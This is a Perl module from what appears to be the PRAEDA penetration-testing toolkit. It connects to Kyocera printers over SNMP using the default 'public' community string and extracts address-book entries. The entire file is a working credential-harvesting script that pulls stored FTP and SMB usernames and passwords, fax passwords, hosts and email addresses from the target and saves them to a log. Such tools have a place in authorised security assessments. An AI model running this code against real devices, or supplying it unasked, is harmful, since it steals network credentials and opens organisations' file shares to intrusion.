# Kyocera SNMP Data Scraper 
# 
######################################################
#               PRAEDA Module #MP0023                #
#                Copyright (c) 2015                  #
#              Chris Schatz    "tonix"               #
#                                                    #
######################################################
package MP0023;
sub MP0023
{
 
# Set global variables
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];


# Open output file and setup browser LWP function 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open Output file $LOGFILE.log \n");
print "\n**********Attempting to extract credentials via snmp from $TARGET : JOB MP0023**********\n";

# setup SNMP session
($session,$error) = Net::SNMP->session(Hostname => $TARGET, Community => public);


# Determine number of entries within address book - I believe that this OID contains the current count
my $snmpcount = $session->get_request("1.3.6.1.4.1.1347.42.23.1.4.0");
print OUTFILE "ADDRESS BOOK ENTRIES: ".$snmpcount->{"1.3.6.1.4.1.1347.42.23.1.4.0"}."\n\n";


# Recurse address book and output data to file

foreach my $j (1..$snmpcount->{"1.3.6.1.4.1.1347.42.23.1.4.0"}) {

  my $snmpFN1 = $session->get_request("1.3.6.1.4.1.1347.42.23.2.1.1.1.3.".$j);
  print OUTFILE "NAME 1: ".$snmpFN1->{"1.3.6.1.4.1.1347.42.23.2.1.1.1.3.".$j}."\n";
    
  my $snmpFN2 = $session->get_request("1.3.6.1.4.1.1347.42.23.2.1.1.1.4.".$j);
  print OUTFILE "NAME 2: ".$snmpFN2->{"1.3.6.1.4.1.1347.42.23.2.1.1.1.4.".$j}."\n";

  my $snmpMN = $session->get_request("1.3.6.1.4.1.1347.42.23.2.1.1.1.5.".$j);
  print OUTFILE "ENTRY NUMBER: ".$snmpMN->{"1.3.6.1.4.1.1347.42.23.2.1.1.1.5.".$j}."\n";

  my $snmpFTPPath = $session->get_request("1.3.6.1.4.1.1347.42.23.2.3.1.1.2.".$j.".1");
  print OUTFILE "FTP PATH: ".$snmpFTPPath->{"1.3.6.1.4.1.1347.42.23.2.3.1.1.2.".$j.".1"}."\n";

  my $snmpFTPHost = $session->get_request("1.3.6.1.4.1.1347.42.23.2.3.1.1.3.".$j.".1");
  print OUTFILE "FTP HOST: ".$snmpFTPHost->{"1.3.6.1.4.1.1347.42.23.2.3.1.1.3.".$j.".1"}."\n";

  my $snmpFTPPort = $session->get_request("1.3.6.1.4.1.1347.42.23.2.3.1.1.4.".$j.".1");
  print OUTFILE "FTP PORT: ".$snmpFTPPort->{"1.3.6.1.4.1.1347.42.23.2.3.1.1.4.".$j.".1"}."\n";

  my $snmpFTPUser = $session->get_request("1.3.6.1.4.1.1347.42.23.2.3.1.1.5.".$j.".1");
  print OUTFILE "FTP USER: ".$snmpFTPUser->{"1.3.6.1.4.1.1347.42.23.2.3.1.1.5.".$j.".1"}."\n";

  my $snmpFTPPwd = $session->get_request("1.3.6.1.4.1.1347.42.23.2.3.1.1.6.".$j.".1");
  print OUTFILE"FTP PASSWORD: ".$snmpFTPPwd->{"1.3.6.1.4.1.1347.42.23.2.3.1.1.6.".$j.".1"}."\n";

  my $snmpSMBPath = $session->get_request("1.3.6.1.4.1.1347.42.23.2.4.1.1.2.".$j.".1");
  print OUTFILE "SMB PATH: ".$snmpSMBPath->{"1.3.6.1.4.1.1347.42.23.2.4.1.1.2.".$j.".1"}."\n";

  my $snmpSMBHost = $session->get_request("1.3.6.1.4.1.1347.42.23.2.4.1.1.3.".$j.".1");
  print OUTFILE "SMB HOST: ".$snmpSMBHost->{"1.3.6.1.4.1.1347.42.23.2.4.1.1.3.".$j.".1"}."\n";

  my $snmpSMBPort = $session->get_request("1.3.6.1.4.1.1347.42.23.2.4.1.1.4.".$j.".1");
  print OUTFILE "SMB PORT: ".$snmpSMBPort->{"1.3.6.1.4.1.1347.42.23.2.4.1.1.4.".$j.".1"}."\n";

  my $snmpSMBUser = $session->get_request("1.3.6.1.4.1.1347.42.23.2.4.1.1.5.".$j.".1");
  print OUTFILE "SMB USER: ".$snmpSMBUser->{"1.3.6.1.4.1.1347.42.23.2.4.1.1.5.".$j.".1"}."\n";

  my $snmpSMBPwd = $session->get_request("1.3.6.1.4.1.1347.42.23.2.4.1.1.6.".$j.".1");
  print OUTFILE "SMB PASSWORD: ".$snmpSMBPwd->{"1.3.6.1.4.1.1347.42.23.2.4.1.1.6.".$j.".1"}."\n";

  my $snmpFAXNum = $session->get_request("1.3.6.1.4.1.1347.42.23.2.5.1.1.2.".$j.".1");
  print OUTFILE "FAX NUMBER: ".$snmpFAXNum->{"1.3.6.1.4.1.1347.42.23.2.5.1.1.2.".$j.".1"}."\n";

  my $snmpFAXPwd = $session->get_request("1.3.6.1.4.1.1347.42.23.2.5.1.1.6.".$j.".1");
  print OUTFILE "FAX PASSWORD: ".$snmpFAXPwd->{"1.3.6.1.4.1.1347.42.23.2.5.1.1.6.".$j.".1"}."\n";

  my $snmpEmail = $session->get_request("1.3.6.1.4.1.1347.42.23.2.6.1.1.2.".$j.".1");
  print OUTFILE "EMAIL: ".$snmpEmail->{"1.3.6.1.4.1.1347.42.23.2.6.1.1.2.".$j.".1"}."\n\n";


} # end for loop

$session->close;
close(OUTFILE);

}
1;














